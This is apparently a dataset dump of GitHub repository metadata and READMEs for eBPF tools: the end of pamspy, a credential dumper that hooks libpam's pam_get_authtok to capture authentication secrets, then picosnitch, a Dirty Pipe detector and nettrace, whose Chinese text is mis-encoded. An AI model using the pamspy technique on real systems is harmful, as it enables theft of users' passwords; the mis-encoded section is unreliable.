sudo apt install make clang-11 gcc libelf-dev bpftool
```

Then just build!

```
git clone https://github.com/citronneur/pamspy --recursive
cd pamspy/src
make
```

## How does It works?

`pamspy` will load a userland return probe eBPF program to hook the `pam_get_authtok` function from `libpam.so`. 
PAM stands for ""Pluggable Authentication Modules"", and have a flexible design to manage a different kind of authentication on Linux.

Each time an authentication process tries to check a new user, It will call `pam_get_authtok`, and will be here to dump the content of the critical secrets!

Easy! Enjoy!

## Credits and references

Thanks to @blendin for 3snake tool !!!

"
elesiuta/picosnitch,747,22,747,8,Python,"Monitor Network Traffic Per Executable, Beautifully Visualized",2020-07-15T00:49:13Z,2025-10-11T14:17:42Z,700,"<p align=""center"">
<img src=""https://raw.githubusercontent.com/elesiuta/picosnitch/master/docs/screenshot.png"" width=""90%"" height=""90%"" class=""center"">
<img src=""https://raw.githubusercontent.com/elesiuta/picosnitch/master/docs/web_ui.gif"" width=""45%"" height=""45%"" class=""center""><img src=""https://raw.githubusercontent.com/elesiuta/picosnitch/master/docs/terminal_ui.gif"" width=""45%"" height=""45%"" class=""center"">
</p>

# [Picosnitch](https://elesiuta.github.io/picosnitch/)
- ðŸ”” Receive notifications whenever a new program connects to the network, or when it's modified
- ðŸ“ˆ Monitors your bandwidth, breaking down traffic by executable, hash, parent, domain, port, or user over time
- ðŸŒ Web and terminal interfaces with GeoIP lookups for each connection ([IP Geolocation by DB-IP](https://db-ip.com))
- ðŸ›¡ï¸ Can optionally check hashes or executables using [VirusTotal](https://www.virustotal.com)
- ðŸš€ Executable hashes are cached based on device + inode for improved performance
- ðŸ³ Detects applications running inside containers, multiple versions of the same app are differentiated based on their hash
- ðŸ•µï¸ Uses [BPF](https://ebpf.io/) for [accurate, low overhead bandwidth monitoring](https://www.gcardone.net/2020-07-31-per-process-bandwidth-monitoring-on-Linux-with-bpftrace/) and [fanotify](https://man7.org/linux/man-pages/man7/fanotify.7.html) to watch executables for modification
- ðŸ‘¨â€ðŸ‘¦ Since applications can call others to send/receive data for them, the parent executable and hash is also logged for each connection
- ðŸ§° Pragmatic and minimalist design focusing on [accurate detection with clear and reliable error reporting when it isn't possible](#limitations)

# [Installation](#installation)

### [AUR](https://aur.archlinux.org/packages/picosnitch/) for Arch and derivatives <img src=""https://cdn.simpleicons.org/archlinux"" width=""16"" height=""16"">
<details><summary>Details</summary>

- install `picosnitch` [manually](https://wiki.archlinux.org/title/Arch_User_Repository#Installing_and_upgrading_packages) or using your preferred [AUR helper](https://wiki.archlinux.org/title/AUR_helpers)
</details>

### [PPA](https://launchpad.net/~elesiuta/+archive/ubuntu/picosnitch) for Ubuntu and derivatives <img src=""https://cdn.simpleicons.org/ubuntu"" width=""16"" height=""16"">
<details><summary>Details</summary>

- `sudo add-apt-repository ppa:elesiuta/picosnitch`
- `sudo apt update`
- `sudo apt install picosnitch`
- optionally install [dash](https://pypi.org/project/dash/) with [pip](https://pip.pypa.io/) or [pipx](https://pypa.github.io/pipx/)
  - `sudo apt install pipx`
  - `pipx install dash`
- you may require a newer version of [BCC](https://github.com/iovisor/bcc/blob/master/INSTALL.md#ubuntu---binary) ([unofficial PPA](https://launchpad.net/~hadret/+archive/ubuntu/bpfcc)) since the version in the [Ubuntu repos](https://repology.org/project/bcc-bpf/versions) sometimes lags behind its [supported kernel](https://github.com/iovisor/bcc/releases)
</details>

### [OBS](https://software.opensuse.org//download.html?project=home%3Aelesiuta&package=picosnitch) for Debian and derivatives <img src=""https://cdn.simpleicons.org/debian"" width=""16"" height=""16"">
<details><summary>Details</summary>

- visit the [OBS picosnitch page](https://software.opensuse.org//download.html?project=home%3Aelesiuta&package=picosnitch) and follow the instructions for your distribution
- optionally install [dash](https://pypi.org/project/dash/) with [pip](https://pip.pypa.io/) or [pipx](https://pypa.github.io/pipx/)
  - `sudo apt install pipx`
  - `pipx install dash`
- if you're having issues on bullseye, you may need a newer version of [BCC](https://github.com/iovisor/bcc/blob/master/INSTALL.md#debian---binary)
</details>

### [OBS](https://software.opensuse.org//download.html?project=home%3Aelesiuta&package=picosnitch) for openSUSE Tumbleweed and derivatives <img src=""https://cdn.simpleicons.org/opensuse"" width=""16"" height=""16"">
<details><summary>Details</summary>

- `sudo zypper addrepo https://download.opensuse.org/repositories/home:elesiuta/openSUSE_Tumbleweed/home:elesiuta.repo`
- `sudo zypper refresh`
- `sudo zypper install picosnitch`
</details>

### [Copr](https://copr.fedorainfracloud.org/coprs/elesiuta/picosnitch/) for Fedora, Mageia, Mandriva, and derivatives <img src=""https://cdn.simpleicons.org/fedora"" width=""16"" height=""16"">
<details><summary>Details</summary>

- `sudo dnf copr enable elesiuta/picosnitch`
- `sudo dnf install picosnitch`
- optionally install [dash](https://pypi.org/project/dash/) with [pip](https://pip.pypa.io/) or [pipx](https://pypa.github.io/pipx/)
  - `sudo dnf install pipx`
  - `pipx install dash`
</details>

### [Nixpkgs](https://search.nixos.org/packages?show=picosnitch) for Nix <img src=""https://cdn.simpleicons.org/nixos"" width=""16"" height=""16"">
<details><summary>Details</summary>

- install and enable using the [picosnitch service option](https://search.nixos.org/options?show=services.picosnitch.enable)
  - add `services.picosnitch.enable = true;` to your Nix configuration file (typically `/etc/nixos/configuration.nix`)
  - run `sudo nixos-rebuild switch`
- workaround for ""Failed to compile BPF module""
  - `systemctl stop picosnitch`
  - `sudo picosnitch start-no-daemon` then send SIGINT (ctrl + c)
  - `systemctl start picosnitch`
</details>

### [PyPI](https://pypi.org/project/picosnitch/) for any Linux distribution with Python >= 3.8 <img src=""https://cdn.simpleicons.org/python"" width=""16"" height=""16"">
<details><summary>Details</summary>

- install the [BPF Compiler Collection](https://github.com/iovisor/bcc/blob/master/INSTALL.md) python package for your distribution
  - it should be called `python-bcc` or `python-bpfcc`
- install picosnitch using [pip](https://pip.pypa.io/) or [pipx](https://pypa.github.io/pipx/)
  - `pipx install ""picosnitch[full]""`
- create a service file for systemd to run picosnitch (recommended)
  - `picosnitch systemd`
- optional dependencies (will install from [PyPI](https://pypi.org/) with `[full]` if not already installed)
  - for dash: [dash](https://pypi.org/project/dash/), [pandas](https://pypi.org/project/pandas/), and [plotly](https://pypi.org/project/plotly/)
  - for dash themes: [dash-bootstrap-components](https://pypi.org/project/dash-bootstrap-components/) and [dash-bootstrap-templates](https://pypi.org/project/dash-bootstrap-templates/)
  - for GeoIP lookups: [geoip2](https://pypi.org/project/geoip2/)
  - for notifications: `dbus-python`, `python-dbus`, or `python3-dbus` (name depends on your distro and should be installed from their repo)
  - for sql server: one of [psycopg](https://pypi.org/project/psycopg/), [pymysql](https://pypi.org/project/PyMySQL/), [mariadb](https://pypi.org/project/mariadb/), or [psycopg2](https://pypi.org/project/psycopg2/) (latter two not included with `[full]`)
  - for VirusTotal: [requests](https://pypi.org/project/requests/)
</details>

### [GitHub](https://github.com/elesiuta/picosnitch) for installing from source <img src=""https://cdn.simpleicons.org/linux"" width=""16"" height=""16"">
<details><summary>Details</summary>

- clone the repo or download `picosnitch.py` and `setup.py`
- install the [BPF Compiler Collection](https://github.com/iovisor/bcc/blob/master/INSTALL.md) python package for your distribution
  - it should be called `python-bcc` or `python-bpfcc`
- install [psutil](https://pypi.org/project/psutil/)
- install `python-setuptools`
- install picosnitch with `python setup.py install --user`
- see other options with `python setup.py [build|install] --help`
- you can also run the script `picosnitch.py` directly
</details>

# [Usage](#usage)
- Running picosnitch
  - enable/disable autostart on reboot with `systemctl enable|disable picosnitch`
  - start/stop/restart with `systemctl start|stop|restart picosnitch`
  - or if you don't use systemd `picosnitch start|stop|restart`
- Web user interface for browsing past connections
  - start with `picosnitch dash`
  - visit [http://localhost:5100](http://localhost:5100) (you change this by setting the environment variables `HOST` and `PORT`)
- Terminal user interface for browsing past connections
  - start with `picosnitch view`
  - `space/enter/f`: filter on entry `e`: exclude entry `backspace/F/E`: remove filter `h/H`: step through history (time offset) `t/T`: cycle time range `u/U`: cycle byte units `r`: refresh view `q`: quit
- Show usage with `picosnitch help`

# [Configuration](#configuration)
- Config is stored in `~/.config/picosnitch/config.json`
  - restart picosnitch if it is currently running for any changes to take effect

```yaml
{
  ""DB retention (days)"": 30, # How many days to keep connection logs in snitch.db
  ""DB sql log"": true, # Write connection logs to snitch.db (SQLite)
  ""DB sql server"": {}, # Write connection logs to a MariaDB, MySQL, or PostgreSQL server
  ""DB text log"": false, # Write connection logs to conn.log
  ""DB write limit (seconds)"": 10, # Minimum time between connection log entries
  # increasing it decreases disk writes by grouping traffic into larger time windows
  # reducing time precision, decreasing database size, and increasing hash latency
  ""Dash scroll zoom"": true, # Enable scroll zooming on plots
  ""Dash theme"": """", # Select a theme name from https://bootswatch.com/
  # requires installing https://pypi.org/project/dash-bootstrap-components/
  # and https://pypi.org/project/dash-bootstrap-templates/ with pip or pipx
  ""Desktop notifications"": true, # Try connecting to dbus to show notifications
  ""Every exe (not just conns)"": false, # Check every running executable with picosnitch
  # these are treated as ""connections"" with a port of -1
  # this feature is experimental but should work fairly well, errors should be expected as
  # picosnitch is unable to open file descriptors for some extremely short-lived processes
  # if you just want logs (no hashes) to trace process hierarchy, see execsnoop or forkstat
  ""GeoIP lookup"": true, # GeoIP lookup of IP addresses in user interface (terminal and web)
  ""Log addresses"": true, # Log remote addresses for each connection
  ""Log commands"": true, # Log command line args for each executable
  ""Log ignore"": [], # List of hashes (str), domains (str), IP subnets (str), or ports (int)
  # will omit connections that match any of these from the connection log
  # domains are in reverse domain name notation and will match all subdomains
  # the process name, executable, and hash will still be recorded in record.json
  ""Log ports"": true, # Log local and remote ports for each connection
  ""Perf ring buffer (pages)"": 256, # Power of two number of pages for BPF program
  # only change this if it is giving you errors (e.g. missed events)
  # picosnitch opens a perf buffer for each event type, so this is multiplied by up to 18
  ""Set RLIMIT_NOFILE"": null, # Set the maximum number of open file descriptors (int)
  # it is used for caching process executables and hashes (typical system default is 1024)
  # this is good enough for most people since caching is based on executable device + inode
  # fanotify is used to detect if a cached executable is modified to trigger a hash update
  ""Set st_dev mask"": null, # Mask device number for open file descriptors (int)
  # set to 0 to disable verification if it is giving you errors (e.g. FD cache errors)
  # defaults to 0 if a btrfs partition is detected, otherwise 0xffffffff
  ""VT API key"": """", # API key for VirusTotal, leave blank to disable (str)
  ""VT file upload"": false, # Upload file if hash not found, only hashes are used by default
  ""VT request limit (seconds)"": 15 # Number of seconds between requests (free tier quota)
}
```

# [Logging](#logging)
- A log of seen executables is stored in `~/.config/picosnitch/exe.log`
  - this is a history of your notifications
- A record of seen executables is stored in `~/.config/picosnitch/record.json`
  - this is used for determining whether to create a notification
  - it contains known process name(s) by executable, executable(s) by process name, and sha256 hash(es) with VirusTotal results by executable
- Enable `DB sql log` (default) to write the full connection log to `~/.config/picosnitch/snitch.db`
  - this is used for `picosnitch dash`, `picosnitch view`, or something like [DB Browser](https://sqlitebrowser.org/)
  - note, connection times are based on when the group is processed, so they are accurate to within `DB write limit (seconds)` at best, and could be delayed if the previous group is slow to hash
  - notifications are handled by a separate subprocess, so they are not subject to the same delays as the connection log
- Use `DB sql server` to write the full connection log to a MariaDB, MySQL, or PostgreSQL server
  - this is independent of `DB sql log` and is used for providing an [off-system copy to prevent tampering](https://en.wikipedia.org/wiki/Host-based_intrusion_detection_system#Protecting_the_HIDS) (use [GRANT](https://www.postgresql.org/docs/current/sql-grant.html) to assign privileges and see [limitations](#limitations) for other caveats)
  - to configure, add the key `client` to `DB sql server` with value `mariadb`, `psycopg`, `psycopg2`, or `pymysql`, you can also optionally set `table_name`
  - assign remaining connection parameters for [mariadb](https://mariadb-corporation.github.io/mariadb-connector-python/usage.html#connecting), [psycopg](https://www.psycopg.org/docs/module.html#psycopg2.connect), or [pymysql](https://pymysql.readthedocs.io/en/latest/modules/connections.html) to `DB sql server` as key/value pairs
- Enable `DB text log` to write the full connection log to `~/.config/picosnitch/conn.log`
  - this may be useful for watching with another program
  - it contains the following fields, separated by commas (commas, newlines, and null characters are removed from values)
  - `entry time, sent bytes, received bytes, executable path, process name, cmdline, sha256, parent executable, parent name, parent cmdline, parent sha256, user id, local port, remote port, local address, remote address, domain`
- The error log is stored in `~/.config/picosnitch/error.log`
  - errors will also trigger a notification and are usually caused by far too many or extremely short-lived processes/connections, or suspending your system while a new executable is being hashed
  - while it is very unlikely for processes/connections to be missed (unless `Every exe (not just conns)` is enabled), picosnitch was designed such that it should still detect this and log an error giving you some indication of what happened
  - for most people in most cases, this should raise suspicion that a program may be misbehaving
  - a program should not be able to hide from picosnitch (either by omission or spoofing another program) without picosnitch reporting an error
  - see [limitations](#limitations) below for other sources of errors

# [Limitations](#limitations)
- Despite focusing on reliability and notable advantages over [existing tools](https://www.gcardone.net/2"
airbus-cert/dirtypipe-ebpf_detection,28,3,28,0,C,An eBPF detection program for CVE-2022-0847,2022-07-05T07:20:59Z,2024-12-16T13:13:20Z,2,"# dirtypipe-ebpf_detection -- Dirtypipe detection tool

This program was made to detect Dirty Pipe exploitation attempts thanks to eBPF. It also monitors nonvulnerable kernels and docker containers.

![](/.images/088d790795eb65a66c268d61039feeea5455bae6.gif)

:flight_departure: If you want more details on how it works please read the [blog](https://skyblue.team/posts/dirtypipe-ebpf-detection/) post ! :flight_arrival:

## How does it works?

**Default execution:**

```bash
sudo ./bin/dirtypipe_detection
```

**Debug mode:**

> Show libbpf logs on execution

```bash
sudo ./bin/dirtypipe_detection --debug
```

**Daemon mode:**

> Run program as daemon and send alerts over syslog

```bash
sudo ./bin/dirtypipe_detection --daemon
```

## How to build?

### Debian

```bash
sudo apt install git make pkg-config libelf-dev clang-11 libc6-dev-i386 bpftool -y
git clone https://github.com/airbus-cert/dirtypipe-ebpf_detection
cd ./dirtypipe-ebpf_detection/src/
make
```

### Ubuntu

```bash
sudo apt install git make pkg-config libelf-dev clang-11 libc6-dev-i386 linux-tools-common linux-tools-$(uname -r) -y
git clone https://github.com/airbus-cert/dirtypipe-ebpf_detection
cd ./dirtypipe-ebpf_detection/src/
make
```

## Credits and References

Read the original [blog](https://dirtypipe.cm4all.com/) on Dirtypipe from max.kellermann@ionos.com

Read an interesting strategy from [Datadog](https://www.datadoghq.com/blog/dirty-pipe-vulnerability-overview-and-remediation/) team
"
OpenCloudOS/nettrace,454,105,454,4,C,nettrace is a eBPF-based tool to trace network packet and diagnose network problem.,2021-12-21T01:45:10Z,2025-10-04T17:42:04Z,604,"# nettrace - ç½‘ç»œè¯Šæ–­å·¥å…·

## ä¸€ã€å·¥å…·ç®€ä»‹

### 1.1 èƒŒæ™¯

åœ¨ä¸€äº›åœºæ™¯ä¸‹ï¼ˆç‰¹åˆ«æ˜¯äº‘åŽŸç”Ÿåœºæ™¯ï¼‰ï¼ŒLinuxç³»ç»Ÿä¸­çš„ç½‘ç»œéƒ¨ç½²å˜å¾—è¶Šæ¥è¶Šå¤æ‚ã€‚ä¸€ä¸ªTCPè¿žæŽ¥ï¼Œä»Žå®¢æˆ·ç«¯åˆ°æœåŠ¡ç«¯ï¼Œä¸­é—´å¯èƒ½è¦ç»è¿‡å¤æ‚çš„`NAT`ã€`GRE`ã€`IPVS`ç­‰è¿‡ç¨‹ï¼Œç½‘ç»œæŠ¥æ–‡åœ¨èŠ‚ç‚¹ï¼ˆä¸»æœºï¼‰ä¸Šçš„å¤„ç†è·¯å¾„ä¹Ÿå˜å¾—è¶Šæ¥è¶Šé•¿ã€‚åœ¨å‘ç”Ÿç½‘ç»œæ•…éšœï¼ˆæ¯”å¦‚ç½‘ç»œä¸¢åŒ…ï¼‰æ—¶ï¼Œå¦‚ä½•å¿«é€Ÿã€æœ‰æ•ˆåœ°å®šä½å‡ºç½‘ç»œé—®é¢˜æˆä¸ºäº†ä¸€ä¸ªéš¾é¢˜ã€‚ç›®å‰å¸¸è§„çš„ç½‘ç»œæ•…éšœå®šä½æ‰‹æ®µï¼Œå¦‚`tcpdump`ã€`dropwatch`ã€`ftrace`ã€`kprobe`ç­‰å­˜åœ¨ä¸€å®šçš„çŸ­æ¿ï¼š

- `tcpdump`ï¼šåªèƒ½åœ¨é“¾è·¯å±‚æŠ“åŒ…ï¼Œæ— æ³•å®šä½å†…æ ¸åè®®æ ˆä¸­çš„é—®é¢˜ï¼Œæ¯”å¦‚å¸¸è§„çš„å†…æ ¸ä¸¢åŒ…é—®é¢˜
- `ftrace`ï¼šåªèƒ½è·Ÿè¸ªå†…æ ¸å‡½æ•°ï¼Œæ— æ³•è¿›è¡ŒæŠ¥æ–‡è¿‡æ»¤ï¼Œä¸”å…¥æ‰‹è¾ƒéš¾ï¼Œéœ€è¦å¯¹å†…æ ¸åè®®æ ˆæœ‰ä¸€å®šäº†è§£
- `kprobe`ï¼šä¸´æ—¶ç¼–å†™å†…æ ¸æ¨¡å—ï¼Œæ•ˆçŽ‡å’Œå®‰å…¨æ€§ä½Ž
- `BCC`ï¼šåŠŸèƒ½å•ä¸€ï¼Œä¸´æ—¶ç¼–å†™`BCC`ç¨‹åºè·Ÿè¸ªæ•ˆçŽ‡ä½Žï¼Œéœ€è¦å¯¹å†…æ ¸æœ‰ä¸€å®šäº†è§£ï¼Œå…¥æ‰‹éš¾
- `dropwatch`ï¼šåŠŸèƒ½å•ä¸€ï¼Œåªèƒ½æŸ¥çœ‹ç½‘ç»œä¸¢åŒ…é—®é¢˜ï¼Œä¸”æ— æ³•å¾—åˆ°ä¸¢åŒ…åŽŸå› å’Œè§£å†³æ–¹æ¡ˆ

åœ¨æ­¤èƒŒæ™¯ä¸‹ï¼Œç¬”è€…ç»“åˆå¤šå¹´çš„Kernelç½‘ç»œåè®®æ ˆæ•…éšœå®šä½ç»éªŒï¼ŒåŸºäºŽeBPFå¼€å‘äº†LinuxçŽ¯å¢ƒä¸‹ç½‘ç»œæ•…éšœå®šä½å·¥å…·é›†â€”â€”`nettrace`ã€‚

### 1.2 åŠŸèƒ½ä»‹ç»

`nettrace`æ˜¯ä¸€æ¬¾åŸºäºŽeBPFçš„é›†ç½‘ç»œæŠ¥æ–‡è·Ÿè¸ªï¼ˆæ•…éšœå®šä½ï¼‰ã€ç½‘ç»œæ•…éšœè¯Šæ–­ã€ç½‘ç»œå¼‚å¸¸ç›‘æŽ§äºŽä¸€ä½“çš„ç½‘ç»œå·¥å…·é›†ï¼Œæ—¨åœ¨èƒ½å¤Ÿæä¾›ä¸€ç§æ›´åŠ é«˜æ•ˆã€æ˜“ç”¨çš„æ–¹æ³•æ¥è§£å†³å¤æ‚åœºæ™¯ä¸‹çš„ç½‘ç»œé—®é¢˜ã€‚ç›®å‰ï¼Œå…¶å®žçŽ°çš„åŠŸèƒ½åŒ…æ‹¬ï¼š

- ç½‘ç»œæŠ¥æ–‡è·Ÿè¸ªï¼šè·Ÿè¸ªç½‘ç»œæŠ¥æ–‡ä»Žè¿›å…¥åˆ°å†…æ ¸åè®®æ ˆåˆ°é‡Šæ”¾/ä¸¢å¼ƒçš„è¿‡ç¨‹ä¸­åœ¨å†…æ ¸ä¸­æ‰€èµ°è¿‡çš„è·¯å¾„ï¼Œå®žçŽ°æŠ¥æ–‡æ•´ä¸ªç”Ÿå‘½å‘¨æœŸçš„ç›‘æŽ§ï¼Œå¹¶é‡‡é›†ç”Ÿå‘½å‘¨æœŸå„ä¸ªé˜¶æ®µçš„äº‹ä»¶ã€ä¿¡æ¯ã€‚é€šè¿‡è§‚å¯ŸæŠ¥æ–‡åœ¨å†…æ ¸ä¸­çš„è·¯å¾„ï¼Œå¯¹äºŽæœ‰ä¸€å®šå†…æ ¸åè®®æ ˆç»éªŒçš„äººæ¥è¯´å¯ä»¥å¿«é€Ÿã€æœ‰æ•ˆåœ°å‘çŽ°ç½‘ç»œé—®é¢˜ã€‚
- ç½‘ç»œæ•…éšœè¯Šæ–­ï¼šå°†ä»¥å¾€çš„ç»éªŒé›†æˆåˆ°å·¥å…·çš„çŸ¥è¯†åº“ï¼Œé€šè¿‡çŸ¥è¯†åŒ¹é…çš„æ–¹å¼æ¥ä¸»åŠ¨è¯Šæ–­å½“å‰ç½‘ç»œæ•…éšœï¼Œç»™å‡ºè¯Šæ–­ç»“æžœä»¥åŠä¿®å¤å»ºè®®ã€‚è¯¥åŠŸèƒ½å…¥æ‰‹ç®€å•ã€æ˜“ç”¨æ€§å¼ºï¼Œæ— éœ€è¿‡å¤šçš„ç½‘ç»œç»éªŒå³å¯è¿›è¡Œç½‘ç»œé—®é¢˜å®šä½ã€‚
- ç½‘ç»œå¼‚å¸¸ç›‘æŽ§ï¼šå¸¸æ€åŒ–åœ°éƒ¨ç½²åˆ°ç”Ÿäº§çŽ¯å¢ƒä¸­ï¼Œä¸»åŠ¨åœ°å‘çŽ°ã€ä¸ŠæŠ¥çŽ¯å¢ƒä¸Šçš„ç½‘ç»œå¼‚å¸¸ã€‚
- `droptrace`ï¼šç”¨äºŽè·Ÿè¸ªã€ç›‘æŽ§ç³»ç»Ÿä¸­çš„ä¸¢åŒ…äº‹ä»¶çš„å·¥å…·ï¼Œç‚¹å‡»[è¿™é‡Œ](docs/droptrace.md)æŸ¥çœ‹è¯¦æƒ…ä»‹ç»ã€‚è¯¥åŠŸèƒ½å·²è¢«é—å¼ƒï¼Œå¯ä»¥ä½¿ç”¨`nettrace --drop`å®žçŽ°ç›¸åŒçš„åŠŸèƒ½ã€‚
- æ€§èƒ½åˆ†æžï¼šé€šè¿‡è·Ÿè¸ªåè®®æ ˆå¤„ç†å»¶è¿Ÿã€TCP RTTç­‰ä¿¡æ¯è¿›è¡Œç½‘ç»œæ€§èƒ½åˆ†æžã€‚

## äºŒã€ç¼–è¯‘å®‰è£…

nettraceæ˜¯é‡‡ç”¨Cè¯­è¨€ç¼–å†™çš„åŸºäºŽeBPFï¼ˆlibbpfï¼‰çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œåœ¨ä½¿ç”¨å’Œå®‰è£…æ—¶å¯ä»¥ç”¨ç¼–è¯‘å¥½çš„RPMåŒ…å’ŒäºŒè¿›åˆ¶ç¨‹åºã€‚æœ¬å·¥å…·å¯¹å„ä¸ªç‰ˆæœ¬çš„å†…æ ¸éƒ½è¿›è¡Œäº†å…¼å®¹ï¼Œæœ€ä½Žå¯æ”¯æŒcentos7çš„3.10ç‰ˆæœ¬çš„å†…æ ¸ï¼ˆéœ€è¦è‡ªå·±ç¼–è¯‘ï¼‰ã€‚

### 2.1 RPM/DEBå®‰è£…

å¯¹äºŽæ”¯æŒBTFç‰¹æ€§ï¼ˆå†…æ ¸ç‰ˆæœ¬ >= 5.3ï¼Œå¹¶ä¸”é…ç½®äº†`CONFIG_DEBUG_INFO_BTF=y`å†…æ ¸é…ç½®é¡¹ï¼‰çš„å†…æ ¸ï¼Œå¯ä»¥ç›´æŽ¥ä¸‹è½½[releases](https://github.com/OpenCloudOS/nettrace/releases)ä¸­ç¼–è¯‘å¥½çš„`nettrace-xxx-1.btf.x86_64.rpm`ã€`nettrace-xxx-1.btf.x86_64.deb`å®‰è£…åŒ…è¿›è¡Œå®‰è£…ä½¿ç”¨ï¼›å¯¹äºŽä¸æ”¯æŒBTFçš„ä½Žç‰ˆæœ¬çš„å†…æ ¸ï¼Œéœ€è¦åœ¨å¯¹åº”çš„ç³»ç»Ÿä¸Šæ‰‹åŠ¨ç¼–è¯‘åŽæ‰èƒ½ä½¿ç”¨ã€‚å¯¹äºŽOpenCloudOS/TencentOSç³»ç»Ÿï¼Œå¯ä»¥ç›´æŽ¥ä½¿ç”¨yumå‘½ä»¤æ¥è¿›è¡Œåœ¨çº¿å®‰è£…ï¼š

```shell
sudo yum install nettrace
```

ä¹Ÿå¯ä»¥ç›´æŽ¥ä»Ž[releases](https://github.com/OpenCloudOS/nettrace/releases)ä¸­ä¸‹è½½å¯¹åº”çš„RPM/DEBå®‰è£…åŒ…ï¼Œæ‰‹åŠ¨è¿›è¡Œå®‰è£…ã€‚

### 2.2 äºŒè¿›åˆ¶ä¸‹è½½

ç›´æŽ¥ä»Ž[releases](https://github.com/OpenCloudOS/nettrace/releases)ä¸‹è½½ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶åŒ…ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œ[releases](https://github.com/OpenCloudOS/nettrace/releases)ä¸­çš„`tar.bz2`æ ¼å¼çš„åŽ‹ç¼©åŒ…å³ä¸ºäºŒè¿›åˆ¶ç¨‹åºã€‚ç”±äºŽé‡Œé¢çš„å·¥å…·é‡‡ç”¨çš„éƒ½æ˜¯é™æ€ç¼–è¯‘çš„æ–¹å¼ï¼Œå› æ­¤åœ¨å†…æ ¸ç‰ˆæœ¬æ”¯æŒçš„æƒ…å†µä¸‹ï¼Œéƒ½æ˜¯å¯ä»¥ç›´æŽ¥ä¸‹è½½è§£åŽ‹åŽè¿è¡Œçš„ã€‚**å†æ¬¡æé†’**ï¼šå¯¹äºŽä¸æ”¯æŒBTFçš„å†…æ ¸ç‰ˆæœ¬ï¼Œéœ€è¦æ‰‹åŠ¨ç¼–è¯‘æ‰èƒ½ä½¿ç”¨ã€‚

### 2.3 æ‰‹åŠ¨ç¼–è¯‘

ä¸‹é¢æ¥ä»‹ç»ä¸‹å¦‚ä½•åœ¨Centosã€ubuntuç­‰çŽ¯å¢ƒä¸Šè¿›è¡Œnettraceå·¥å…·çš„æ‰‹åŠ¨ç¼–è¯‘å’Œå®‰è£…ã€‚æœ¬å·¥å…·ç›®å‰åœ¨3.10/4.14/4.15/5.4/5.15/6.4ç­‰ç‰ˆæœ¬çš„å†…æ ¸ä¸Šå‡è¿›è¡Œè¿‡é€‚é…å’Œæµ‹è¯•ã€‚ç”±äºŽæœ¬å·¥å…·å¯¹äºŽlibbpfçš„ç‰ˆæœ¬è¦æ±‚æ¯”è¾ƒé«˜ï¼Œå› æ­¤å»ºè®®ä½¿ç”¨**åŸºäºŽdocker**çš„æ–¹å¼æ¥è¿›è¡Œç¼–è¯‘ã€‚

#### 2.3.1 ä¾èµ–å®‰è£…

æœ¬å·¥å…·åœ¨ç¼–è¯‘çš„æ—¶å€™ä¾èµ–äºŽ`libelf`ã€`libbpf`å’Œ`bpftool`ç»„ä»¶ï¼Œ`clang`å’Œ`gcc`ç¼–è¯‘å·¥å…·ã€‚å¯¹äºŽä¸æ”¯æŒBTFçš„å†…æ ¸ï¼Œè¿˜éœ€è¦å®‰è£…`kernel-headers`å¤´æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹ç›®å½•`/lib/modules/$(uname -a)/build`æ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­`headers`æ˜¯å¦å·²ç»è¢«å®‰è£…äº†ã€‚

**æ³¨æ„äº‹é¡¹**ï¼š
1. è¯·å°½é‡ä½¿ç”¨è¾ƒé«˜ç‰ˆæœ¬çš„libbpfï¼ˆv0.2ä»¥ä¸Šç‰ˆæœ¬ï¼‰ã€‚å¦‚æžœå½“å‰å‘è¡Œç‰ˆçš„libbpfåº“ç‰ˆæœ¬è¾¾ä¸åˆ°è¦æ±‚ï¼Œå¯ä»¥æ‰‹åŠ¨è¿›è¡Œlibbpfçš„ç¼–è¯‘å®‰è£…ï¼š

    ```shell
    wget https://github.com/libbpf/libbpf/archive/refs/tags/v1.1.0.tar.gz
    tar -xf v1.1.0.tar.gz
    cd libbpf-1.1/src
    make install
    ```

2. clangç‰ˆæœ¬è¦åœ¨10+

##### ubuntu/debian

å¯¹äºŽubuntuç³»ç»Ÿï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®‰è£…ä¾èµ–ï¼š

```shell
sudo apt install python3 python3-yaml libelf-dev libbpf-dev linux-headers-`uname -r` clang llvm gcc linux-tools-`uname -r` linux-tools-generic -y
```

##### opencloudos/tencentos/centos

å¯¹äºŽopencloudos/tencentos/centosç”¨æˆ·ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å®‰è£…ä¾èµ–ï¼š

```shell
sudo yum install python3-yaml elfutils-devel elfutils-devel-static libbpf-devel libbpf-static kernel-headers kernel-devel clang llvm bpftool -y
```

#### 2.3.2 ç¼–è¯‘

ç›´æŽ¥ä¸‹è½½nettraceçš„æºç å³å¯è¿›è¡Œç¼–è¯‘å®‰è£…ï¼š

```shell
git clone https://github.com/OpenCloudOS/nettrace.git
cd nettrace
make all
```

æ”¯æŒçš„ç¼–è¯‘é€‰é¡¹æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š

- **NO_BTF**ï¼š

  **æ³¨æ„**ï¼šå¯¹äºŽä¸æ”¯æŒBTFçš„å†…æ ¸ï¼ˆå†…æ ¸ç‰ˆæœ¬ä½ŽäºŽ5.3ï¼‰ï¼Œåœ¨ç¼–è¯‘çš„æ—¶å€™éœ€è¦åŠ å‚æ•°`NO_BTF=1`ï¼Œé‡‡ç”¨å…¼å®¹æ¨¡å¼è¿›è¡Œç¼–è¯‘ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

  ```shell
  make NO_BTF=1 all
  ```

  å¯ç”¨è¯¥å‚æ•°ï¼ŒeBPFç¨‹åºä¼šä»¥BPF_PROBE_READçš„æ–¹å¼æ¥è¯»å–æ•°æ®ï¼›å¦åˆ™ï¼ŒeBPFç¨‹åºä¼šä»¥BPF_CORE_READçš„æ–¹å¼æ¥è¯»å–ã€‚

- **INLINE**ï¼š

  ä»¥å®Œå…¨å†…è”çš„æ–¹ä¾¿ç¼–è¯‘BPFç¨‹åºï¼Œå¯¹äºŽä¸æ”¯æŒsubprogçš„å†…æ ¸ï¼ˆå†…æ ¸ç‰ˆæœ¬åœ¨4.15åŠä»¥ä¸‹ï¼‰éœ€è¦æŒ‡å®šè¿™ä¸ªå‚æ•°ï¼š
  ```shell
  make NO_BTF=1 INLINE=1 all
  ```
